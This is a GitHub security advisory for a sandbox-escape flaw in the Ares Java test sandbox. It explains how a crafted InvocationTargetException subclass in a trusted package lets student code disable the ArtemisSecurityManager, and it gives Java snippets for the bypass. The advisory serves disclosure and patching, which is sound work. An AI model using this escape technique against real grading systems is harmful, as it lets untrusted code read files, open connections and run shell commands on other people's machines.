# [H] Trust Boundary Violation due to Incomplete Blacklist in Test Failure Processing in Ares

## Summary
Severity: High
Advisory: GHSA-883x-6fch-6wjx
CVE: CVE-2024-23683
Ecosystem: Maven
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2022-01-21
Source: https://github.com/advisories/GHSA-883x-6fch-6wjx
Type: github-advisory

## Affected
- Maven: `de.tum.in.ase:artemis-java-test-sandbox` — affected >=0 <1.7.6

## Details
### Impact
This allows an attacker to create special subclasses of `InvocationTargetException` that escape the exception sanitization because JUnit extracts the cause in a trusted context before the exception reaches Ares. This means that arbitrary student code can be executed in a trusted context, and that in turn allows disabling Ares and having full control over the system.

### Patches
Update to version `1.7.6` or later.

### Workarounds
Forbid student classes in trusted packages like, e.g., described in https://github.com/ls1intum/Ares/issues/15#issuecomment-996449371

### References
_Are there any links users can visit to find out more?_
Not that I know of.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in https://github.com/ls1intum/Ares/issues
* Email us, see https://github.com/ls1intum/Ares/security/policy

### Detailed description
Using generics, it is possible to throw checked exceptions without a `throws` clause:
<details>
<summary>ThrowWithoutThrowsHelper</summary>

```java
public class ThrowWithoutThrowsHelper<X extends Throwable>
{
    private final X throwable;

    private ThrowWithoutThrowsHelper(X throwable)
    {
        this.throwable = throwable;
    }

    private <R> R throwWithThrows() throws X
    {
        throw throwable;
    }

    public static <R> R throwWithoutThrows(Throwable throwable)
    {
        ThrowWithoutThrowsHelper<?> helper = new ThrowWithoutThrowsHelper<Throwable>(throwable);
        @SuppressWarnings("unchecked")
        ThrowWithoutThrowsHelper<RuntimeException> helperCasted = (ThrowWithoutThrowsHelper<RuntimeException>) helper;
        return helperCasted.throwWithThrows();
    }
}
```
</details>

Using this, it is possible for a malicious testee to throw an instance of a malicious subclass of `InvocationTargetException` (let's call it `EvilInvocationTargetException`).

This exception is catched by `org.junit.platform.commons.util.ReflectionUtils::invokeMethod`, which looks like this:
<details>
<summary>ReflectionUtils::invokeMethod</summary>

```java
    public static Object invokeMethod(Method method, Object target, Object... args) {
        Preconditions.notNull(method, "Method must not be null");
        Preconditions.condition((target != null || isStatic(method)),
            () -> String.format("Cannot invoke non-static method [%s] on a null target.", method.toGenericString()));

        try {
            return makeAccessible(method).invoke(target, args);
        }
        catch (Throwable t) {
            throw ExceptionUtils.throwAsUncheckedException(getUnderlyingCause(t));
        }
    }
```
</details>

This method calls `getUnderlyingCause` (of the same class), passing to it the catched, malicious exception as an argument.
<details>
<summary>ReflectionUtils::getUnderlyingCause</summary>

```java
    private static Throwable getUnderlyingCause(Throwable t) {
        if (t instanceof InvocationTargetException) {
            return getUnderlyingCause(((InvocationTargetException) t).getTargetException());
        }
        return t;
    }
```
</details>

`getUnderlyingCause` in turn checks if the passed exception is `instanceof InvocationTargetException`, and if so, calls `getTargetException` on it. `getTargetException` can be overridden by subclasses of `InvocationTargetException`, like the `EvilInvocationTargetException`.
If `EvilInvocationTargetException` is in a whitelisted package (for example `de.tum.in.test.api.security.notsealedsubpackage`), `getTargetException` will be called with the entire stack containing only whitelisted frames.
This allows the attacker to uninstall the `ArtemisSecurityManager` in `EvilInvocationTargetException::getTargetException`:
<details>
<summary>Uninstalling ArtemisSecurityManager</summary>

```java

SecurityManager secman = System.getSecurityManager();
Class<?> aresSecmanClass = secman.getClass();
Field isPartlyDisabledF = aresSecmanClass.getDeclaredField("isPartlyDisabled");
isPartlyDisabledF.setAccessible(true);
isPartlyDisabledF.set(secman, true);
System.setSecurityManager(null);
```
</details>

After uninstalling `ArtemisSecurityManager`, the attacker is free to do anything expressible in Java; including reading and writing any files, opening network connections, and executing arbitrary shell commands.

## References
- https://github.com/ls1intum/Ares/security/advisories/GHSA-883x-6fch-6wjx
- https://github.com/ls1intum/Ares/issues/15#issuecomment-996449371
- https://github.com/ls1intum/Ares/commit/af4f28a56e2fe600d8750b3b415352a0a3217392
- https://github.com/ls1intum/Ares
- https://github.com/ls1intum/Ares/releases/tag/1.7.6
